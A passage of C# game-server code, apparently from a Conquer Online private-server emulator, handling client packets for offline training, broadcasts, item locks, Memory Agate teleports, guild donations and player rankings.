                                    client.Send(new Message($"#53 NPC ID : [{client.ActiveNpc}], Skin: [{npc.Mesh}]", System.Drawing.Color.White, Message.TopLeft));
                            }
                        }
                        break;
                    }
                #endregion
                #region Compose (2036)
                case 2036:
                    {
                        Compose compose = new Compose(false);
                        compose.Deserialize(packet);
                        ComposePlus(compose, client);
                        break;
                    }
                #endregion
                #region Offline TG (2044)
                case 2044:
                    {
                        OfflineTGRequest otgr = new OfflineTGRequest(false);
                        otgr.Deserialize(packet);
                        switch (otgr.ID)
                        {
                            case OfflineTGRequest.OnTrainingTimeRequested:
                                {
                                    otgr.Minutes = 900;
                                    client.Send(otgr);
                                    break;
                                }
                            case OfflineTGRequest.OnConfirmation:
                                {
                                    if (client.Map.BaseID == 6001 || client.Map.BaseID == 6000 || client.Map.BaseID == 1038)
                                        return;
                                    client.Entity.PreviousMapID = client.Entity.MapID;
                                    client.Entity.PrevX = client.Entity.X;
                                    client.Entity.PrevY = client.Entity.Y;
                                    client.Entity.MapID = 601;
                                    client.Entity.X = 64;
                                    client.Entity.Y = 56;
                                    client.OfflineTGEnterTime = DateTime.Now;
                                    client.Disconnect();
                                    break;
                                }
                            case OfflineTGRequest.ClaimExperience:
                                {
                                    var T1 = new TimeSpan(DateTime.Now.Ticks);
                                    var T2 = new TimeSpan(client.OfflineTGEnterTime.Ticks);
                                    ushort minutes = (ushort)(T1.TotalMinutes - T2.TotalMinutes);
                                    minutes = (ushort)Math.Min((ushort)900, minutes);
                                    double expballGain = (double)300 * (double)minutes / (double)900;
                                    while (expballGain >= 100)
                                    {
                                        expballGain -= 100;
                                        client.IncreaseExperience(client.ExpBall, false);
                                    }
                                    if (expballGain != 0)
                                        client.IncreaseExperience((uint)(client.ExpBall * (expballGain / 100)), false);

                                    client.Entity.SetLocation(client.Entity.PreviousMapID, client.Entity.PrevX, client.Entity.PrevY);
                                    if (client.Map.ID == 1036 || client.Map.ID == 1039
                                        || client.Map.ID == 8877 || client.Map.ID == 1735
                                        || client.Map.ID == 1734 || client.Map.ID == 1733
                                        || client.Map.ID == 1732 || client.Map.ID == 1731
                                        || client.Map.ID == 1730 || client.Map.ID == 1766 || client.Map.ID == 1090
                                        || client.Map.ID == 8510 || client.Map.ID == 8511 || client.Map.ID == 8512
                                        || client.Map.ID == 8514 || client.Map.ID == 8527 || client.Map.ID == 8518
                                        || client.Map.ID == 8526 || client.Map.ID == 8522 || client.Map.ID == 8523
                                        || client.Map.ID == 8524 || client.Map.ID == 8525 || client.Map.ID == 1024 || client.Map.ID == 16414)
                                        client.Entity.Teleport(1002, 311, 289);
                                    if (client.Map.ID == 1036 || client.Map.ID == 1039)
                                        client.Entity.Teleport(1002, 303, 278);
                                    else
                                    {
                                        switch (client.Map.ID)
                                        {
                                            default:
                                                {
                                                    client.Entity.Teleport(1002, 303, 278);
                                                    break;
                                                }
                                            case 1000:
                                                {
                                                    client.Entity.Teleport(1000, 500, 650);
                                                    break;
                                                }
                                            case 1020:
                                                {
                                                    client.Entity.Teleport(1020, 565, 562);
                                                    break;
                                                }
                                            case 1011:
                                                {
                                                    client.Entity.Teleport(1011, 188, 264);
                                                    break;
                                                }
                                            case 1015:
                                                {
                                                    client.Entity.Teleport(1015, 717, 571);
                                                    break;
                                                }
                                        }
                                    }
                                    client.OfflineTGEnterTime = DateTime.Now;
                                    break;
                                }
                            default:
                                client.Send(otgr);
                                break;
                        }
                        break;
                    }
                #endregion
                #region Trade partner (2046)
                case 2046:
                    {
                        TradePartner partner = new TradePartner(false);
                        partner.Deserialize(packet);
                        switch (partner.Type)
                        {
                            case TradePartner.RequestPartnership:
                                RequestTradePartnership(partner, client);
                                break;
                            case TradePartner.RejectRequest:
                                RejectPartnership(partner, client);
                                break;
                            case TradePartner.BreakPartnership:
                                BreakPartnership(partner, client);
                                break;
                        }
                        break;
                    }
                #endregion
                #region Guild Arsenal (2202 + 2203)
                case 2202:
                    {
                        ArsenalView view = new ArsenalView(false, 0);
                        view.Deserialize(packet);
                        ViewArsenalPage(view, client);
                        break;
                    }
                case 2203:
                    {
                        ArsenalCommand command = new ArsenalCommand();
                        command.Deserialize(packet);
                        switch (command.Type)
                        {
                            case ArsenalCommand.Unlock:
                                UnlockArsenal(command, client);
                                break;
                            case ArsenalCommand.Inscribe:
                                InscribeArsenalItem(command, client);
                                break;
                            case ArsenalCommand.Uninscribe:
                                UninscribeArsenalItem(command, client);
                                break;
                            case ArsenalCommand.Enchant:
                                EnchantArsenal(command, client);
                                break;
                            case ArsenalCommand.View:
                                ViewGuildArsenal(client);
                                break;
                        }
                        break;
                    }
                #endregion
                #region ItemLock (2048)
                case 2048:
                    {
                        if (client.Action != 2)
                            return;
                        ItemLock itemlock = new ItemLock(false);
                        itemlock.Deserialize(packet);
                        switch (itemlock.ID)
                        {
                            case ItemLock.RequestLock:
                                LockItem(itemlock, client);
                                break;
                            case ItemLock.RequestUnlock:
                                UnlockItem5Days(itemlock, client);
                                break;
                        }
                        break;
                    }
                #endregion               
                #region Broadcast (2050)
                case 2050:
                    {
                        Broadcast cast = new Broadcast(false);
                        cast.Deserialize(packet);
                        switch (cast.Type)
                        {
                            case Broadcast.ReleaseSoonMessages:
                                {
                                    BroadcastInfoAwaiting(cast, client);
                                    break;
                                }
                            case Broadcast.MyMessages:
                                {
                                    BroadcastClientMessages(cast, client);
                                    break;
                                }
                            case Broadcast.BroadcastMessage:
                                {
                                    if (Game.ConquerStructures.Broadcast.Broadcasts.Count == Constants.MaxBroadcasts)
                                    {
                                        client.Send(new Message("You cannot send any broadcasts for now. The limit has been reached. Wait until a broadcast is chopped down.", System.Drawing.Color.Red, Message.TopLeft));
                                        break;
                                    }
                                    DateTime Now = DateTime.Now;
                                    DateTime LastBC = client["lastbroadcast"];

                                    if (Now >= LastBC.AddMinutes(2) || client.Account.State == Database.AccountTable.AccountState.GM)
                                    {
                                        if (client.Trade != null)
                                        {
                                            if (client.Trade.InTrade)
                                                break;
                                        }
                                        if (client.Entity.ConquerPoints >= rates.Broadcast)
                                        {
                                            client["lastbroadcast"] = Now;
                                            client.Entity.ConquerPoints -= rates.Broadcast;
                                            Game.ConquerStructures.Broadcast.BroadcastStr broadcast = new Game.ConquerStructures.Broadcast.BroadcastStr();
                                            broadcast.EntityID = client.Entity.UID;
                                            broadcast.EntityName = client.Entity.Name;
                                            broadcast.ID = Game.ConquerStructures.Broadcast.BroadcastCounter.Next;
                                            if (cast.List[0].Length > 80)
                                                cast.List[0] = cast.List[0].Remove(80);
                                            broadcast.Message = cast.List[0];
                                            broadcast.Message = Filter(broadcast.Message, client);
                                            if (Game.ConquerStructures.Broadcast.Broadcasts.Count == 0)
                                            {
                                                if (Game.ConquerStructures.Broadcast.CurrentBroadcast.EntityID == 1)
                                                {
                                                    Game.ConquerStructures.Broadcast.CurrentBroadcast = broadcast;
                                                    Game.ConquerStructures.Broadcast.LastBroadcast = DateTime.Now;
                                                    Kernel.SendWorldMessage(new Message(broadcast.Message, "ALLUSERS", client.Entity.Name, System.Drawing.Color.Red, Message.BroadcastMessage), Program.Values);
                                                    //new Database.MySqlCommand(Database.MySqlCommandType.UPDATE).Update("configuration").Set("LastPlayerBC", client.Entity.Name).Set("MessageBC", cast.List[0]).Execute();
                                                    client.Send(cast);
                                                    break;
                                                }
                                            }
                                            File.AppendAllText(Constants.DatabaseBasePath + "broadcasts.txt", broadcast.EntityName + " | " + broadcast.EntityID + " | MESSAGE: '" + broadcast.Message + "'");
                                            Game.ConquerStructures.Broadcast.Broadcasts.Add(broadcast);
                                            cast.dwParam = (uint)Game.ConquerStructures.Broadcast.Broadcasts.Count;
                                            client.Send(cast);
                                            break;
                                        }
                                        else
                                        {
                                            client.MessageBox("You Don't have " + rates.Broadcast + " cps");
                                        }
                                    }
                                    break;
                                }
                            case Broadcast.Urgen5CPs:
                                {
                                    for (int c = 0; c < Game.ConquerStructures.Broadcast.Broadcasts.Count; c++)
                                    {
                                        var broadcast = Game.ConquerStructures.Broadcast.Broadcasts[c];
                                        if (broadcast.ID == cast.dwParam)
                                        {
                                            if (c != 0)
                                            {
                                                if (client.Trade != null)
                                                {
                                                    if (client.Trade.InTrade)
                                                        break;
                                                }
                                                if (client.Entity.ConquerPoints > rates.Broadcast)
                                                {
                                                    broadcast.SpentCPs += rates.Broadcast;
                                                    client.Entity.ConquerPoints -= rates.Broadcast;
                                                    if (Game.ConquerStructures.Broadcast.Broadcasts[c - 1].SpentCPs <= broadcast.SpentCPs)
                                                    {

                                                        Game.ConquerStructures.Broadcast.Broadcasts[c] = Game.ConquerStructures.Broadcast.Broadcasts[c - 1];
                                                        Game.ConquerStructures.Broadcast.Broadcasts[c - 1] = broadcast;
                                                    }
                                                    else
                                                    {
                                                        Game.ConquerStructures.Broadcast.Broadcasts[c] = broadcast;
                                                    }
                                                }
                                                else
                                                {
                                                    client.MessageBox("You Don't have " + rates.Broadcast + " cps");
                                                }
                                            }
                                        }
                                    }
                                    break;
                                }
                            case Broadcast.Urgen15CPs:
                                {
                                    for (int c = 0; c < Game.ConquerStructures.Broadcast.Broadcasts.Count; c++)
                                    {
                                        var broadcast = Game.ConquerStructures.Broadcast.Broadcasts[c];
                                        if (broadcast.ID == cast.dwParam)
                                        {
                                            if (c != 0)
                                            {
                                                if (client.Trade != null)
                                                {
                                                    if (client.Trade.InTrade)
                                                        break;
                                                }
                                                if (client.Entity.ConquerPoints > rates.Broadcast * 3)
                                                {
                                                    broadcast.SpentCPs += rates.Broadcast * 3;
                                                    client.Entity.ConquerPoints -= rates.Broadcast * 3;
                                                    for (int b = c - 1; b > 0; b--)
                                                        Game.ConquerStructures.Broadcast.Broadcasts[b] = Game.ConquerStructures.Broadcast.Broadcasts[b - 1];

                                                    Game.ConquerStructures.Broadcast.Broadcasts[0] = broadcast;
                                                }
                                                else
                                                {
                                                    client.MessageBox("You Don't have " + rates.Broadcast * 3 + " cps");
                                                }
                                            }
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region Nobility (2064)
                case 2064:
                    {
                        NobilityInfo nobility = new NobilityInfo(false);
                        nobility.Deserialize(packet);
                        Game.ConquerStructures.Nobility.Handle(nobility, client);
                        break;
                    }
                #endregion
                #region Race potions (2072)
                case 2072:
                    {
                        RacePotion pot = new RacePotion(false);
                        pot.Deserialize(packet);
                        int i = pot.Location - 1;
                        if (i < 0 || i > 4)
                            return;
                        if (client.Potions[i] == null)
                            return;
                        var potion = client.Potions[i];
                        potion.Count--;

                        pot.PotionType = potion.Type;
                        pot.Amount = (ushort)potion.Count;
                        client.Send(pot);

                        client.ApplyRacePotion(potion.Type, pot.dwParam);

                        if (potion.Count == 0)
                            client.Potions[i] = null;
                        break;
                    }
                #endregion
                #region MemoryAgate
                case 2110:
                    {
                        uint ItemUID = BitConverter.ToUInt32(packet, 8);
                        switch (packet[4])
                        {
                            case 1://record
                                {
                                    if (client.Map.IsDynamic()) return;
                                    ConquerItem Item = null;
                                    if (Constants.revnomap.Contains(client.Entity.MapID) || Constants.MemoryAgateNotAllowedMap.Contains(client.Entity.MapID))
                                        return;
                                    if (client.Inventory.TryGetItem(ItemUID, out Item))
                                    {
                                        if (Item.Agate_map.ContainsKey(packet[12]))
                                        {
                                            Item.Agate_map[(uint)packet[12]] = client.Entity.MapID
                                               + "~" + client.Entity.X
                                               + "~" + client.Entity.Y;
                                            Database.ConquerItemTable.UpdateItemAgate(Item);
                                            Item.SendAgate(client);
                                            break;
                                        }
                                        if (packet[12] > Item.Agate_map.Count)
                                        {
                                            Item.Agate_map.Add((byte)(Item.Agate_map.Count), client.Entity.MapID
                                               + "~" + client.Entity.X
                                               + "~" + client.Entity.Y);
                                            Database.ConquerItemTable.UpdateItemAgate(Item);
                                            Item.SendAgate(client);
                                            break;
                                        }
                                        else
                                        {
                                            if (!Item.Agate_map.ContainsKey(packet[12]))
                                            {

                                                Item.Agate_map.Add(packet[12], client.Entity.MapID
                                                    + "~" + client.Entity.X

                                                   + "~" + client.Entity.Y);
                                                Database.ConquerItemTable.UpdateItemAgate(Item);
                                                Item.SendAgate(client);
                                            }
                                            break;
                                        }
                                    }
                                    break;
                                }
                            case 3://recal
                                {
                                    if (client.Map.IsDynamic()) return;
                                    if (Constants.revnomap.Contains(client.Entity.MapID) || Constants.MemoryAgateNotAllowedMap.Contains(client.Entity.MapID))
                                        return;
                                    ConquerItem Item = null;
                                    if (client.Inventory.TryGetItem(ItemUID, out Item))
                                    {

                                        if (Item.Agate_map.ContainsKey(packet[12]))
                                        {
                                            if (ushort.Parse(Item.Agate_map[packet[12]].Split('~')[0].ToString()) == 1038)
                                                return;
                                            if (ushort.Parse(Item.Agate_map[packet[12]].Split('~')[0].ToString()) == 6001)
                                                return;
                                            if (ushort.Parse(Item.Agate_map[packet[12]].Split('~')[0].ToString()) == 1036)
                                            {
                                                if (client.Entity.ConquerPoints < 10000)
                                                    return;
                                                else
                                                    client.Entity.ConquerPoints -= 10000;
                                                client.Entity.Teleport(ushort.Parse(Item.Agate_map[packet[12]].Split('~')[0].ToString())
                                                    , ushort.Parse(Item.Agate_map[packet[12]].Split('~')[1].ToString())
                                                    , ushort.Parse(Item.Agate_map[packet[12]].Split('~')[2].ToString()));
                                                Item.Durability--;
                                                Item.SendAgate(client);
                                                Database.ConquerItemTable.UpdateItemAgate(Item);

                                                //client.MessageBox("Teleport to market costs 10k Cps, Continue?", p =>
                                                //{
                                                //    if (client.Entity.ConquerPoints < 10000)
                                                //        return;
                                                //    else
                                                //        client.Entity.ConquerPoints -= 10000;
                                                //    p.Entity.Teleport(ushort.Parse(Item.Agate_map[packet[12]].Split('~')[0].ToString())
                                                //        , ushort.Parse(Item.Agate_map[packet[12]].Split('~')[1].ToString())
                                                //        , ushort.Parse(Item.Agate_map[packet[12]].Split('~')[2].ToString()), false);
                                                //    Item.Durability--;
                                                //    Item.SendAgate(client);
                                                //    Database.ConquerItemTable.UpdateItemAgate(Item);
                                                //}, null);
                                                return;
                                            }
                                            else
                                            {
                                                client.Entity.Teleport(ushort.Parse(Item.Agate_map[packet[12]].Split('~')[0].ToString())
                                                            , ushort.Parse(Item.Agate_map[packet[12]].Split('~')[1].ToString())
                                                            , ushort.Parse(Item.Agate_map[packet[12]].Split('~')[2].ToString()));
                                                Item.Durability--;
                                                Item.SendAgate(client);
                                                Database.ConquerItemTable.UpdateItemAgate(Item);
                                            }
                                        }
                                    }
                                    break;
                                }
                            case 4://repair
                                {
                                    ConquerItem Item = null;
                                    if (client.Inventory.TryGetItem(ItemUID, out Item))
                                    {
                                        int cost = (int)(Item.MaximDurability - Item.Durability) / 2;
                                        if (cost == 0)
                                            cost = 1;
                                        if (client.Entity.ConquerPoints > cost)
                                        {
                                            client.Entity.ConquerPoints -= (uint)cost;
                                            Item.Durability = Item.MaximDurability;
                                            Item.SendAgate(client);
                                            Database.ConquerItemTable.UpdateItemAgate(Item);
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region TopGuilds
                case 1058:
                    {
                        if (client.Guild != null && client.AsMember != null)
                        {
                            if (client.AsMember != null)
                            {
                                Writer.WriteUInt64(client.AsMember.SilverDonation, 8, packet);
                                Writer.WriteUInt32((uint)client.AsMember.ConquerPointDonation, 12, packet);
                                Writer.WriteUInt32((uint)client.AsMember.ArsenalDonation, 24, packet);
                                Writer.WriteUInt32(client.AsMember.PkDonation, 20, packet);
                                Writer.WriteUInt32(client.AsMember.Rouses, 28, packet);
                                Writer.WriteUInt32(client.AsMember.Tulips, 32, packet);
                                Writer.WriteUInt32(client.AsMember.Lilies, 36, packet);
                                Writer.WriteUInt32(client.AsMember.Orchids, 40, packet);
                                Writer.WriteUInt32((uint)(client.AsMember.Orchids
                                    + (uint)client.AsMember.Rouses
                                    + (uint)client.AsMember.Tulips
                                    + (uint)client.AsMember.Lilies), 44, packet);
                            }
                            Writer.WriteUInt32(0, 16, packet);//history donation
                            if (client.Guild != null)
                                client.Guild.SendGuild(client);
                            client.Send(packet);
                        }
                        break;
                    }
                #endregion
                #region Flowers (1150)
                case 1150:
                    PacketHandler.SendFlower(client, packet);
                    return;
                #endregion
                #region Flowers (1151)
                case 1151:
                    {
                        switch (packet[4])
                        {
                            case 2:
                                {
                                    if (IsGirl(client.Entity.Body))
                                    {
                                        if (client.Entity.MyFlowers != null)
                                        {
                                            int my_rank = -1;
                                            uint typ = CreateMyRank(client, out my_rank);

                                            packet[4] = 5;
                                            client.Send(packet);

                                            client.Entity.FlowerRank = (uint)client.Entity.MyFlowers.SendScreenValue((Game.Features.Flowers.FlowersT)typ, (int)my_rank);
                                            GamePackets.GenericRanking ranking = new GamePackets.GenericRanking(true);
                                            ranking.Mode = 2;
                                            ranking.RankingType = client.Entity.FlowerRank;
                                            ranking.Count = 1;

                                            int rank = my_rank;
                                            // if (rank > 0 && rank <= 100)
                                            //    rank -= 1;
                                            switch (typ)
                                            {
                                                case (byte)Game.Features.Flowers.FlowersT.Rouse:
                                                    ranking.Append((uint)rank, (uint)client.Entity.MyFlowers.RedRoses, client.Entity.UID, client.Entity.Name);
                                                    break;
                                                case (byte)Game.Features.Flowers.FlowersT.Lilies:
                                                    ranking.Append((uint)rank, (uint)client.Entity.MyFlowers.Lilies, client.Entity.UID, client.Entity.Name);
                                                    break;
                                                case (byte)Game.Features.Flowers.FlowersT.Orchids:
                                                    ranking.Append((uint)rank, (uint)client.Entity.MyFlowers.Orchads, client.Entity.UID, client.Entity.Name);
                                                    break;
                                                case (byte)Game.Features.Flowers.FlowersT.Tulips:
                                                    ranking.Append((uint)rank, (uint)client.Entity.MyFlowers.Tulips, client.Entity.UID, client.Entity.Name);
                                                    break;
                                                default:
                                                    break;
                                            }
                                            client.Send(ranking.ToArray());
                                            packet[4] = 5;
                                            client.Send(packet);

                                        }
                                    }
                                    else
                                    {
                                        if (client.Entity.MyFlowers != null)
                                        {

                                            GamePackets.GenericRanking ranking = new GamePackets.GenericRanking(true);
                                            ranking.Mode = 2;
                                            //  ranking.RankingType = GamePackets.GenericRanking.Kiss;
                                            ranking.Count = 1;
                                            if (client.Entity.MyFlowers.RankRoses < 100 && client.Entity.MyFlowers.RankRoses > 0)
                                            {
                                                ranking.Append((uint)client.Entity.MyFlowers.RankRoses, client.Entity.MyFlowers.RedRoses, client.Entity.UID, client.Entity.Name);
                                                client.Send(ranking.ToArray());
                                            }

                                            packet[4] = 5;
                                            client.Send(packet);
                                        }
                                    }

                                    break;
                                }
                            #region Prestigee
                            case 6:
                                {
                                    PrestigeRank.Load();
                                    GamePackets.GenericRanking ranking = new GamePackets.GenericRanking(true, 10);
                                    #region Best
                                    GenericRanking Rank = new GenericRanking(true);
                                    Rank.Mode = 6;
                                    Rank.Count = 10;
                                    var toper = PrestigeRank.Topers.Values.OrderByDescending(e => e.Prestige).ThenByDescending(e => e.Level).ThenBy(e => e.UID).FirstOrDefault();
                                    Rank.Append2(1, toper.Prestige, toper.UID, toper.Name, toper.Level, toper.Class, toper.Mesh, true);
                                    foreach (var typ in PrestigeRank.Topers.Values)
                                    {
                                        Rank.Append2(1, typ.Prestige, typ.UID, typ.Name, typ.Level, typ.Class, typ.Mesh);
                                    }
                                    client.Send(Rank);
                                    #endregion
                                    #region All
                                    var index = new byte[11] { 0, 15, 25, 45, 55, 65, 75, 85, 135, 145, 165 };
                                    Game.Entity Trojan = null;
                                    Game.Entity Warrior = null;
                                    Game.Entity Archer = null;
                                    Game.Entity Ninja = null;
                                    Game.Entity Monk = null;
                                    Game.Entity Pirate = null;
                                    Game.Entity Dragon = null;
                                    Game.Entity Water = null;
                                    Game.Entity Fire = null;
                                    Game.Entity WindWalker = null;
                                    for (int i = 0; i < 10; i++)
                                    {
                                        if (i == 1)
                                            Trojan = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 2)
                                            Warrior = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 3)
                                            Archer = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 4)
                                            Ninja = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 5)
                                            Monk = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 6)
                                            Pirate = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 7)
                                            Dragon = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 8)
                                            Water = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 9)
                                            Fire = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                        if (i == 10)
                                            WindWalker = PerfectionScore.RankingList.Where(x => x.Class >= (index[i] - 5) && x.Class <= index[i]).OrderByDescending(x => x.TotalPerfectionScore).ThenByDescending(x => x.Level).ThenBy(x => x.UID).FirstOrDefault();
                                    }
                                    Entity[] array = new Entity[10] { Trojan, Warrior, Archer, Ninja, Monk, Pirate, Dragon, Water, Fire, WindWalker };
                                    byte count = 0;
                                    if (Trojan != null) count++;
                                    if (Warrior != null) count++;
                                    if (Fire != null) count++;
                                    if (Water != null) count++;
                                    if (Ninja != null) count++;
                                    if (Monk != null) count++;
                                    if (Pirate != null) count++;
                                    if (Dragon != null) count++;
                                    if (Archer != null) count++;
                                    if (WindWalker != null) count++;
                                    var nRanking = new GenericRanking(true);
                                    nRanking.Mode = 6;
                                    nRanking.Page = ranking.Page;
                                    nRanking.Count = count;
                                    for (byte z = 0; z < array.Length; z++)
                                    {
                                        var Entity = array[z];
                                        if (Entity == null) continue;
                                        nRanking.AppendP((uint)(z + 1), Entity.TotalPerfectionScore, Entity.UID, Entity.Name, Entity.Level, Entity.Class, Entity.Mesh);
                                    }
                                    client.Send(nRanking);
                                    #endregion
                                    break;
                                }
                            #endregion
                            case 1://Rank
                                {
                                    uint uid = BitConverter.ToUInt32(packet, 8);
                                    ushort pagenumber = BitConverter.ToUInt16(packet, 14);
                                    const int max = 10;
                                    GamePackets.GenericRanking ranking = new GamePackets.GenericRanking(true, 10);
                                    ranking.Mode = 1;
                                    ranking.Page = pagenumber;
                                    ranking.RankingType = uid;
                                    switch (uid)
                                    {
                                        #region Perfection
                                        case 80000001:
                                        case 80000002:
                                        case 80000003:
                                        case 80000004:
                                        case 80000005:
                                        case 80000006:
                                        case 80000007:
                                        case 80000008:
                                        case 80000009:
                                        case 80000010:
                                            {
                                                ushort page = ranking.Page;
                                                byte realyclass = 0;
                                                if (ranking.RankingType % 10 == 1) realyclass = 15;
                                                if (ranking.RankingType % 10 == 2) realyclass = 25;
                                                if (ranking.RankingType % 10 == 3) realyclass = 45;
                                                if (ranking.RankingType % 10 == 4) realyclass = 55;
                                                if (ranking.RankingType % 10 == 5) realyclass = 65;
                                                if (ranking.RankingType % 10 == 6) realyclass = 75;
                                                if (ranking.RankingType % 10 == 7) realyclass = 85;
                                                if (ranking.RankingType % 10 == 8) realyclass = 135;
                                                if (ranking.RankingType % 10 == 9) realyclass = 145;
                                                if (ranking.RankingType % 10 == 10) realyclass = 165;
                                                var array = PerfectionScore.RankingList.Where(i => i.Class >= (realyclass - 5) && i.Class <= realyclass).OrderByDescending(i => i.TotalPerfectionScore).ThenByDescending(i => i.Level).ThenBy(i => i.UID).ToArray();
                                                uint count = (uint)Math.Min(array.Length - page * 10, 10);
                                                var nRanking = new GenericRanking(true, count);
                                                nRanking.Mode = Network.GamePackets.GenericRanking.Ranking;
                                                nRanking.RankingType = ranking.RankingType;
                                                nRanking.Page = page;
                                                nRanking.RegisteredCount = (ushort)Math.Min(array.Length * 100, 100);
                                                int rank = (int)page * 10;
                                                for (int i = rank; i < rank + count; i++)
                                                {
                                                    var current = array[i];
                                                    nRanking.AppendP((uint)(i + 1), (uint)(current.TotalPerfectionScore), current.UID, current.Name, current.Level, current.Class, current.Mesh);
                                                }
                                                client.Send(nRanking);
                                                break;
                                            }
                                        case 80000000:
                                            {
                                                var array = PerfectionScore.RankingList.OrderByDescending(i => i.TotalPerfectionScore).ThenByDescending(i => i.Level).ThenBy(i => i.UID).ToArray();

                                                var nRanking = new GenericRanking(true);
                                                nRanking.RegisteredCount = (ushort)Math.Min(array.Length, 100);
                                                nRanking.Mode = 1;
                                                nRanking.RankingType = ranking.RankingType;
                                                nRanking.Page = ranking.Page;
                                                //  nRanking.Count = (ushort)Math.Min(array.Length - (ranking.Page * 10), 10);
                                                uint sss = (ushort)Math.Min(array.Length - (ranking.Page * 10), 10);

                                                int rank = (int)nRanking.Page * 10;

                                                for (int i = rank; i < rank + sss; i++)
                                                {
                                                    var current = array[i]; if (current == null) break;
                                                    nRanking.AppendP((uint)(i + 1), current.TotalPerfectionScore, current.UID, current.Name, current.Level, current.Class, current.Mesh);
                                                }
                                                client.Send(nRanking);
                                                break;
                                            }
                                        #endregion
                                        case GamePackets.GenericRanking.RoseFairy:
                                            {
                                                if (pagenumber > 9) break;
                                                ranking.RegisteredCount = 100;
                                                MTA.Game.Features.Flowers.Flowers[] info = MTA.Game.Features.Flowers.Flowers.RedRousesTop100.ToArray();
                                                if (info == null) break;
                                                int offset = pagenumber * max;
                                                int count = Math.Min(max, info.Length);
                                                ranking.Count = (uint)count;

                                                for (byte x = 0; x < count; x++)
                                                {
                                                    if (x + offset >= info.Length) break;
                                                    var entity = info[x + offset];
                                                    if (entity.UID == 0) break;
                                                    ranking.Append((uint)(entity.RankRoses + 1), (uint)entity.RedRoses, entity.UID, entity.Name);
                                                }
                                                client.Send(ranking.ToArray());
                                                break;
                                            }
                                        case GamePackets.GenericRanking.LilyFairy:
                                            {
                                                if (pagenumber > 9) break;
                                                ranking.RegisteredCount = 100;
                                                MTA.Game.Features.Flowers.Flowers[] info = MTA.Game.Features.Flowers.Flowers.LiliesTop100;
                                                if (info == null) break;
                                                int offset = pagenumber * max;
                                                int count = Math.Min(max, info.Length);
                                                ranking.Count = (uint)count;

                                                for (byte x = 0; x < count; x++)
                                                {
                                                    if (x + offset >= info.Length) break;
                                                    var entity = info[x + offset];
                                                    if (entity.UID == 0) break;
                                                    ranking.Append((uint)entity.RankLilies, (uint)entity.Lilies, entity.UID, entity.Name);
                                                }
                                                client.Send(ranking.ToArray());

                                                break;
                                            }
                                        case GamePackets.GenericRanking.OrchidFairy:
                                            {
                                                if (pagenumber > 9) break;
                                                ranking.RegisteredCount = 100;
                                                MTA.Game.Features.Flowers.Flowers[] info = MTA.Game.Features.Flowers.Flowers.OrchidsTop100;
                                                if (info == null) break;
                                                int offset = pagenumber * max;
                                                int count = Math.Min(max, info.Length);
                                                ranking.Count = (uint)count;

                                                for (byte x = 0; x < count; x++)
                                                {
                                                    if (x + offset >= info.Length) break;
                                                    var entity = info[x + offset];
                                                    if (entity.UID == 0) break;
                                                    ranking.Append((uint)entity.RankOrchids, (uint)entity.Orchads, entity.UID, entity.Name);
                                                }
                                                client.Send(ranking.ToArray());
                                                break;
                                            }
                                        case GamePackets.GenericRanking.TulipFairy:
                                            {
                                                if (pagenumber > 9) break;
                                                ranking.RegisteredCount = 100;
                                                MTA.Game.Features.Flowers.Flowers[] info = MTA.Game.Features.Flowers.Flowers.TulipsTop100;
                                                if (info == null) break;
                                                int offset = pagenumber * max;
                                                int count = Math.Min(max, info.Length);
                                                ranking.Count = (uint)count;

                                                for (byte x = 0; x < count; x++)
                                                {
                                                    if (x + offset >= info.Length) break;
                                                    var entity = info[x + offset];
                                                    if (entity.UID == 0) break;
                                                    ranking.Append((uint)entity.RankTuilps, (uint)entity.Tulips, entity.UID, entity.Name);
                                                }
                                                client.Send(ranking.ToArray());
                                                break;
                                            }
                                        case GamePackets.GenericRanking.DragonChi:
                                            {
                                                ShowGenericRanking(ranking, client);
                                                break;
                                            }
                                        case GamePackets.GenericRanking.TigerChi:
                                            {
                                                ShowGenericRanking(ranking, client);
                                                break;
                                            }
                                        case GamePackets.GenericRanking.PhoenixChi:
                                            {
                                                ShowGenericRanking(ranking, client);
                                                break;
                                            }
                                        case GamePackets.GenericRanking.TurtleChi:
                                            {
                                                ShowGenericRanking(ranking, client);
                                                break;
                                            }

                                    }
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region FairyFlower (2070)
                case 2070:
                    {
                        FairySpawn FS = new FairySpawn(false);
                        FS.Deserialize(packet);
                        switch (FS.SType)
                        {
                            case 1:
                                ushort u1 = BitConverter.ToUInt16(packet, 20);
